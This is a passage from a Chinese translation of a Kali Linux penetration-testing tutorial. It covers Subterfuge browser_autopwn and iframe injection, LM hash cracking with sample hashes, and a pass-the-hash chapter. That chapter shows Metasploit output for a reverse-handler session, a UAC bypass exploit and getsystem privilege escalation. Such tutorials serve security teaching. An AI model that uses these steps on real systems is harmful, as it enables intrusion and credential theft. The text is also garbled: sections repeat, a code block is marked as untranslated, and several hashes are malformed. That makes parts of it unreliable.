
root@kali:~$

root@kali:~# `subteruge`

```
8. 现在你将看到一个显示服务器已启动并运行的屏幕。
```

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_135_0.png)

9. 现在打开 Iceasel 并访问 `127.0.0.1:80`。你将看到 `subteruge` 的主界面：

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_135_1.png)

注意，这里有一个显示用户名和密码的地方、一个 Modules 和 Settings 菜单以及一个 Start 按钮。我们可以执行的几种不同攻击都在 Modules 菜单下。我们可以通过 Settings 菜单修改 `subteruge` 的功能，而 Start 则启动某些攻击。

## 浏览器自动破解 (Browser Autopwn)

让我们尝试 `Browser_Autopwn` 攻击。`Subteruge` 会启动一个恶意服务器，并加载大量的不同的客户端攻击，并将它们用于任何尝试连接的客户端。

1. 点击“Modules”菜单。
2. 点击“HTTP Code Injection”图标。
3. 我们将看到插件设置（Plugin Settings）。保持“browser_autopwn”和“IFrame Injection”的默认值并点击“Apply”。

`HTTP Code injection Module` 插件设置允许用户直接向目标的浏览会话注入载荷（payload）。载荷可以是简单的 javascript/HTML 注入到浏览器漏洞的任何内容。你甚至可以编写自己的注入。

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_136_0.png)

4. `Subterfuge` 自动打开一个窗口并启动 Metasploit。

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_136_1)

5. Metasploit 攻击已就绪：

（此处后续为重复代码块，未予翻译）

# 第五部分 - 密码攻击

## 第16 章 – 破解简单的 LM 哈希值

### 引言

微软对 Windows XP SP3 和 Office 2003 的支持将于 2014 年 4 月 8 日正式结束。根据某些报告，由于 Windows XP 仅剩一年的支持，仍有近 40% 的电脑用户在使用它。

这意味着有大量的 Windows XP 系统仍然在关键业务岗位上运行。这些系统是以加密的形式存储的。计算机有多种不同的方式来加密密码。最安全的方法之一包括对密码进行“加盐（Salting）”。基本上，这意味着使用一个数字（或盐）并将其纳入哈希处理过程中，以确保没有两个密码是相同的。

如果不使用盐（如在微软 LM 系统上），你可以破解一个哈希值；所有使用相同密码的用户都具有相同的哈希值。因此，你只需要获取该哈希值并与已知的哈希值进行比较，如果匹配成功，你就得到了密码！

许多 Windows XP 系统使用 LM 哈希来保护其密码。这是一种非常老旧且过时的密码哈希存储方法。这种哈希过程是为 Windows NT 之前的系统创建的。

基本上，在使用 LM 哈希的系统中，任何 14 个字符或少的密码都会被转换为全大写，然后分为两个 7 字符的密码。每个部分然后被加密并组合成最终的哈希。

同样，没有使用盐，所以基本上如果你能从系统中获取 LM 哈希，你只需要与其他已知的哈希值进行查找表对比，即可获得实际密码。

一个典型的 Windows 哈希看起来像所示：

```
ac93c8016d14e75a2e9b6bb9e2cbb6:8516cd0838d1a4dfd1ac3eeb9811350
```

LM 哈希位于冒号左侧，NHash 位于右侧。

### 破解 LM 密码

有一些网站允许你输入 Windows LM 哈希，它将返回所使用的密码（如果它在它的查找表中）。

一家名为 Objectif Sécurité（Ophcrack 的创建者）的瑞士公司开发了一种在 SSD 上使用彩虹表的破解技术。他们提供了该技术的在线演示，可以在几秒钟破解许多 LM 密码。

> (http://www.objectif-securite.ch/en/ophcrack.php)

我们将尝试几个哈希值看看它能做什么。让我们从一个简单的开始。这里是 XP 机器上的 Administrator 密码哈希：

**Hash:** `aad3b435b51404eeaad3b435b51404ee:31d6fe0d16ae931b73c59d7e0c0890`

将此输入我们的 Objectif 工具，我们生成了：

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_0.png)

看起来 Administrator 没有设置密码，这不太好……

好吧，那个不是十四个字符，让我们尝试一个复杂的。

**Hash:** `17817c9fb9d272af44df1cb95cae33:6bcec2ba2597f089198735afaea300d4`

以及响应：

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_1.png)

哇！这只用了 4 秒，而且是一个不错的密码。

让我们再尝试一个带有更多特殊字符的：

**Hash:** `d4b3b6605abec1a16a794128df6bc4da:14981697ef5bd52672236c5fdb74af6`

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_2.png)

最后：

**Hash:** `747747dc62e4578d18aeb7cab71d6:43ccc2170b7a4ef851a622ff1560555`

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_3.png)

非常印象深刻，在这次测试中仅用了四到七秒就破解了几个14位字符的复杂密码。

诚然，这些是 Windows LM 哈希，而不是更安全的 Windows 7/Server 2008 NTLM 哈希。

但是，我相信随着破解速度的提高，仅依靠密码可能不再是一个良好的安全措施。许多公司和政府设施正在从仅使用密码转为使用双重认证方法。

生物识别和智能卡在安全设施中变得越来越流行。

### 不确定你拥有的是哪种哈希？

有多种类型的哈希。有时你可能检索到密码哈希，但可能无法确定它是什么类型。`Hash ID` 将识别你提供的哈希类型。

只需运行 `Hash ID` 并输入哈希。

程序将检查它并返回你拥有的最可能的哈希类型，以及不太可能的类型。

从 Kali 菜单中：

`Kali Linux/密码攻击/离线攻击/Offline Attacks`

只需运行 `Hash ID` 并输入哈希。

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_0.png)

```
ac93c8016d14e75a2e9b6bb9e2cbb6:8516cd0838d1a4dfd1ac3eeb9811350
```

LM 哈希位于冒号左侧，NHash 位于右侧。

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_1.png)

```
aad3b435b51404eeaad3b435b51404ee:31d6fe0d16ae931b73c59d7e0c0890
```

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_2.png)

```
17817c9fb9d272af44df1cb95cae33:6bcec2ba2597f089198735afaea300d
```

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_141_3.png)

```
d4b3b6605abec1a16a794128df6bc4da:14981697ef5bd52672236c5fdb74af6
```

```
747747dc62e4578d18aeb7cab71d6:43ccc2170b7a4ef851a622ff1560555
```

### 在 Kali 中查找哈希

手动查找哈希很有趣，但最好在 Kali 内部完成。

> (http://www.objectif-securite.ch/en/ophcrack.php)

### 结论

在本节中，我们了解到计算机并不以明文存储密码。密码以某种方式加密，并且生成的哈希被记录下来。

我们还了解到 LM 哈希并不安全，可以通过查找表（有时被称为“彩虹表”）轻松破解。

如果不在数据库中找不到 LM 哈希，则需要破解程序。你可以关闭 LM 哈希，但安全研究人员发现许多系统为了兼容性仍然在使用它们（即使在关闭的情况下！）。

## 第17 章 – 传递哈希攻击

### 引言

在上一节中，我们查看了基于 LM 的密码有多不安全，但基于 NTLM 的密码呢？

Windows 系统通常将 NTLM 哈希与 LM 哈希一起存储，后者更安全。正如我提到的，LM 哈希可以关闭（或使用超过 14 个字符的密码）。但许多人问我，如果只有 NT 哈希，访问用户账户还需要多长时间？

这是一个很好的问题，答案是，如果满足了某些情况并使用了特定的技术，所需的时间相同。

让我解释一下，如果你能从计算机获取 LM 或 NT 哈希，你就不需要破解它们。真的不需要。有时你只需要直接取哈希作为令牌来访问系统。这种技术被称为**传递哈希攻击（Pass the Hash）**。

传递哈希攻击并不新鲜，在去年举行的“BlackHat USA”会议上有一场演讲，《传递哈希 15 年后》。这应该让你知道这种攻击已经持续了多久。

尽管某些此类攻击在更新后的系统上可能不再有效。杀毒软件和打过补丁的 Windows 系统正在捕获某些机制并阻止它们。设置为使用 NTLM2 或 Kerberos 的网络也能防御这类攻击。

此外，Windows 7 中的用户账户控制（UAC）功能可以阻止许多在 XP 系统上仍然有效的传递哈希攻击。但如果禁用了 UAC（正如我们在本节后面所示），它仍然有效。

但仍然值得查看一些传递哈希技术。

### 使用 Psexec 传递哈希

多年来传递哈希的常用方法之一一直是 `psexec` 命令。

在教程中，我们将从通过 Meterpreter 拥有远程会话开始。

# 激活会话

```
| Id | Type | Connection |
| :--- | :--- | :--- |
| 1 | meterpreter x86/win32 | WIN-ANLOLTDTQU/Ralf @ WIN-ANLOLTDTQU 192.168.198.134:443 -> 192.168.198:49268 (192.168.198,132) |
```

```sf exploit(handler) -> sessions -i 1
[*] Starting interaction with 1...
meter > getuid
Server username: WIN-ANLOLTDTQU/Ralf
meterpreter >
```

如你所见，我使用了“sessions”命令来查看激活会话。只有一个会话，所以我使用“sessions -i 1”命令启动了一个激活会话。

我成功连接到了 Windows 7 会话，最后输入了“getuid”来显示登录系统的用户，在本例中是“Ralf”。

现在让我们获取系统级权限，以便我们可以导出哈希值。这可以通过运行书中之前讨论过的 Bypass UAC 模块简单实现，但我将在这里展示这些步骤：

```
meterpreter > background
[*] Backgrounding session 1...
sf exploit(handler) -> use exploit/windows/local/bypassuac
sf exploit(bypassuac) -> set session 1
sf exploit(bypassuac) -> run
[*] Started reverse handler on 192.168.198.134:444
[*] UAC is Enabled, checking level...
[*] UAC is set to Default
[*] Bypass UAC can bypass this setting, continuing...
[*] Checking admin status...
[*] Administrators group! Continuing...
[*] Uploading the UAC executable to the filesystem...
[*] executing 73802 bytes being uploaded.
[*] Uploaded the agent to the system.
[*] Transfer (73802 bytes) to 192.168.198:132
[*] Session session opened (192.168.198.134:4444) -> 192.168.132:49264
2013-09-23 14:33:42 -0409
meterpreter >
```

很好，用户 Ralf 是管理员，B UAC 函数起作用了。它自动进入了会话 2。现在我们只需要运行“getsystem”命令来获取系统级凭据。

```
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
